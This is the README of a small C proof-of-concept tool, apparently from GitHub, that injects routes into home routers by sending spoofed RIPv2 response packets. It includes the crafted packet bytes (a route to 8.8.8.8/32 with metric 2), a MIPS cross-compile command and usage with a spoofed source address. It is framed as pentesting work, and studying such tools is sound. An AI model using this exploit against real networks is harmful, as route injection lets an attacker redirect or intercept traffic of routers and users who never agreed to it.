# ripinj (RIP Inyector)

Exploit to inject routes into home devices using RIP protocol. Can also be used as a RAW UDP/IP packet generator for UNIX (Linux) devices. 

Pentesting proof of concept for embedded devices (arch MIPS).

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

C compiler (cross compiler for embedded devices such as MIPS or ARM). 

### Installing

Download a copy of the project from github:

```
$ git clone https://github.com/joseigbv/ripinj.git
```

Edit configuration: 

```
...
// --------------------
// config 
// --------------------

#define PORT_SRC 520
#define PORT_DST 520


// ----------------
// ripv response: inyectar ruta 8.8.8.8/32 (metrica 2)
// ----------------
const unsigned char RIP[] =
{
        // rip header 
        0x02,                           // command = response
        0x02,                           // version = 2
        0x00, 0x00,                     // 0
        
        // rip entry table
        0x00, 0x02,                     // address family = 2 (ip)
        0x00, 0x00,                     // route tag = 0
        0x08, 0x08, 0x08, 0x08,         // ip address
        0xff, 0xff, 0xff, 0xff,         // subnet mask
        0x00, 0x00, 0x00, 0x00,         // next hop
        0x00, 0x00, 0x00, 0x02          // metric
};
...

```

Compile:

```
mips-linux-gnu-gcc --static -s -mips32 --sysroot=mips-sysroot ripinj.c -o ripinj
```

### Usage 

Copy 'ripinj' to router device an run: 

```
Usage: ./ripinj <spoof source ip> <dest ip>

 ./ripinj 1.2.3.4 5.6.7.8 
RIP Routing injection v0.2
Sending UDP packet...
Done: packet length: 52
```

## Authors

* **José Ignacio Bravo** - *Initial work* - nacho.bravo@gmail.com

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details

